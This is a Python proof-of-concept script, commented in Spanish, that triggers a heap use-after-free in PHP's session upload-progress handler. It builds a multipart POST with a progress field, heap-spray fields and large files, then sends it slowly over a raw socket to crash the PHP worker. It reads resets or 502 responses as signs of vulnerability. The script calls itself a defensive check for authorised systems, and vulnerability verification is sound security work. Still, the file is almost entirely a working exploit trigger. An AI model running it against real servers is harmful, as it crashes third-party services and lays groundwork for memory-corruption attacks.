#!/usr/bin/env python3
"""
PHP2Shell UAF Trigger — CVE-2026-109618 / CVE-2026-109619
=========================================================
Detección/verificación defensiva del heap use-after-free en
session.upload_progress de PHP.

Envía un multipart POST diseñado para activar la segunda llamada a
php_session_rfc1867_update() (post min_freq), forzando php_session_initialize()
a re-leer la sesión mientras los punteros cacheados (post_bytes_processed,
current_file_bytes_processed) aún apuntan a buckets del ciclo anterior.

Si el target es vulnerable: crash (segfault) / connection reset / 502.
Si está mitigado (enabled=Off, parcheado, o guard activo): upload normal, 200.

Uso:
    python3 poc_trigger.py <url> [--timeout 30] [--cookie PHPSESSID=abc123]

Requiere: requests (pip install requests)
"""

import argparse
import io
import sys
import time
import socket
import ssl
from urllib.parse import urlparse


BOUNDARY = b"----PHP2ShellProbe_" + b"A" * 16

# Nombre por defecto del campo de progreso (session.upload_progress.name)
PROGRESS_FIELD = "PHP_SESSION_UPLOAD_PROGRESS"

# Nombre de sesión por defecto
SESSION_NAME = "PHPSESSID"


def build_multipart_body(
    num_spray_fields: int = 149,
    spray_value_len: int = 64,
    num_files: int = 3,
    file_chunk_size: int = 8192,
    file_total_size: int = 1_048_576,  # 1 MB por archivo
) -> bytes:
    """
    Construye el body multipart con:
    1. Campo PHP_SESSION_UPLOAD_PROGRESS (arma el handler)
    2. Campos t[] para heap spray (reclaman chunks liberados)
    3. Múltiples archivos (provocan múltiples FILE_START → cache + stale)

    El orden importa: el campo de progreso DEBE ir antes del primer archivo.
    Los campos de spray van intercalados para maximizar la probabilidad
    de reclamar el chunk liberado.
    """
    parts = []

    # 1. Campo de progreso — arma el handler
    parts.append(
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="' + PROGRESS_FIELD.encode() + b'"\r\n'
        b"\r\n"
        b"probe_session_key\r\n"
    )

    # 2. Primer bloque de campos spray (mitad)
    spray_val = b"S" * spray_value_len
    half = num_spray_fields // 2
    for i in range(half):
        parts.append(
            b"--" + BOUNDARY + b"\r\n"
            b'Content-Disposition: form-data; name="t[]"\r\n'
            b"\r\n"
            + spray_val + b"\r\n"
        )

    # 3. Archivos — cada FILE_START re-cachea current_file_bytes_processed
    #    y genera FILE_DATA events que escriben a través de los punteros
    file_data = b"\x00" * file_chunk_size
    chunks_per_file = file_total_size // file_chunk_size

    for f in range(num_files):
        # Header del file part
        parts.append(
            b"--" + BOUNDARY + b"\r\n"
            b'Content-Disposition: form-data; name="file' + str(f).encode() + b'"; '
            b'filename="probe' + str(f).encode() + b'.bin"\r\n'
            b"Content-Type: application/octet-stream\r\n"
            b"\r\n"
        )
        # File data — suficiente para superar min_freq (1s default)
        for _ in range(chunks_per_file):
            parts.append(file_data)
        parts.append(b"\r\n")

    # 4. Segundo bloque de campos spray (otra mitad)
    for i in range(half, num_spray_fields):
        parts.append(
            b"--" + BOUNDARY + b"\r\n"
            b'Content-Disposition: form-data; name="t[]"\r\n'
            b"\r\n"
            + spray_val + b"\r\n"
        )

    # Cierre
    parts.append(b"--" + BOUNDARY + b"--\r\n")

    return b"".join(parts)


def send_slow(
    host: str,
    port: int,
    path: str,
    body: bytes,
    use_tls: bool,
    session_cookie: str | None,
    send_rate: int = 32768,  # bytes/s — lo suficientemente lento para superar min_freq
    timeout: int = 30,
) -> tuple[int, str]:
    """
    Envía el POST byte a byte (en chunks de send_rate/10 cada 100ms)
    para garantizar que el upload dure más que min_freq (1s), forzando
    la segunda llamada a update().
    """
    content_type = f"multipart/form-data; boundary={BOUNDARY.decode()}"

    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: {content_type}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
    )
    if session_cookie:
        headers += f"Cookie: {session_cookie}\r\n"

    headers += "\r\n"

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)

    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)

    try:
        sock.connect((host, port))

        # Enviar headers de golpe
        sock.sendall(headers.encode())

        # Enviar body lentamente
        chunk_size = max(1, send_rate // 10)
        offset = 0
        start = time.time()

        while offset < len(body):
            end = min(offset + chunk_size, len(body))
            try:
                sock.sendall(body[offset:end])
            except (BrokenPipeError, ConnectionResetError) as e:
                elapsed = time.time() - start
                return -1, f"Connection reset after {elapsed:.1f}s at offset {offset}/{len(body)} — probable crash ({e})"

            offset = end
            time.sleep(0.1)  # 100ms entre chunks

        elapsed = time.time() - start

        # Leer respuesta
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
            except ConnectionResetError:
                return -1, f"Connection reset while reading response after {elapsed:.1f}s — probable crash"

        # Parsear status code
        if response:
            status_line = response.split(b"\r\n")[0].decode(errors="replace")
            try:
                status_code = int(status_line.split()[1])
            except (IndexError, ValueError):
                status_code = 0
            return status_code, status_line
        else:
            return -1, f"Empty response after {elapsed:.1f}s"

    except ConnectionRefusedError:
        return -2, "Connection refused"
    except socket.timeout:
        return -3, f"Timeout after {timeout}s"
    except Exception as e:
        return -4, str(e)
    finally:
        sock.close()


def main():
    parser = argparse.ArgumentParser(
        description="PHP2Shell UAF trigger — verificación defensiva",
        epilog="Solo para uso en sistemas propios o con autorización explícita.",
    )
    parser.add_argument("url", help="URL del target PHP (ej: https://example.com/index.php)")
    parser.add_argument("--timeout", type=int, default=30, help="Timeout en segundos (default: 30)")
    parser.add_argument("--cookie", help="Cookie de sesión (ej: PHPSESSID=abc123)")
    parser.add_argument("--rate", type=int, default=32768, help="Send rate en bytes/s (default: 32768)")
    parser.add_argument("--spray", type=int, default=149, help="Número de campos spray t[] (default: 149)")
    parser.add_argument("--files", type=int, default=3, help="Número de archivos (default: 3)")
    parser.add_argument("--filesize", type=int, default=1_048_576, help="Tamaño por archivo en bytes (default: 1MB)")
    parser.add_argument("--dry-run", action="store_true", help="Solo muestra el body sin enviar")

    args = parser.parse_args()

    parsed = urlparse(args.url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    use_tls = parsed.scheme == "https"

    print(f"[*] Target: {args.url}")
    print(f"[*] Host: {host}:{port} (TLS: {use_tls})")
    print(f"[*] Spray fields: {args.spray}, Files: {args.files}, File size: {args.filesize}")
    print(f"[*] Send rate: {args.rate} bytes/s")
    print()

    print("[*] Building multipart body...")
    body = build_multipart_body(
        num_spray_fields=args.spray,
        num_files=args.files,
        file_total_size=args.filesize,
    )
    print(f"[*] Body size: {len(body):,} bytes")
    estimated_time = len(body) / args.rate
    print(f"[*] Estimated send time: {estimated_time:.1f}s (needs >1s for min_freq trigger)")

    if estimated_time < 1.5:
        print("[!] WARNING: send time may be too short to trigger second update()")
        print("[!] Increase --filesize or decrease --rate")

    if args.dry_run:
        print("\n[*] Dry run — first 2000 bytes of body:")
        print(body[:2000].decode(errors="replace"))
        return

    print()
    print("[*] Sending slow multipart POST...")
    status, msg = send_slow(
        host=host,
        port=port,
        path=path,
        body=body,
        use_tls=use_tls,
        session_cookie=args.cookie,
        send_rate=args.rate,
        timeout=args.timeout,
    )

    print()
    print(f"[*] Result: status={status}, message={msg}")
    print()

    if status == -1:
        print("[!] CONNECTION RESET — el worker PHP probablemente crasheó (segfault)")
        print("[!] Esto indica que el target ES VULNERABLE al UAF")
        print("[!] Verificar logs del servidor: dmesg, php-fpm.log, error_log")
        sys.exit(2)
    elif status == 502:
        print("[!] 502 Bad Gateway — el worker PHP probablemente crasheó")
        print("[!] Esto indica que el target PROBABLEMENTE ES VULNERABLE")
        sys.exit(2)
    elif status == 200:
        print("[+] 200 OK — el upload se procesó normalmente")
        print("[+] El target NO crasheó. Posibles razones:")
        print("    - session.upload_progress.enabled = Off (mitigado)")
        print("    - PHP ya parcheado")
        print("    - Guard extension activa")
        print("    - Timing insuficiente (probar con --rate más bajo)")
        sys.exit(0)
    elif status == 403:
        print("[*] 403 Forbidden — posible WAF bloqueando multipart")
        sys.exit(1)
    elif status == -2:
        print("[*] Connection refused — target no accesible")
        sys.exit(1)
    else:
        print(f"[?] Resultado inesperado — investigar manualmente")
        sys.exit(1)


if __name__ == "__main__":
    main()
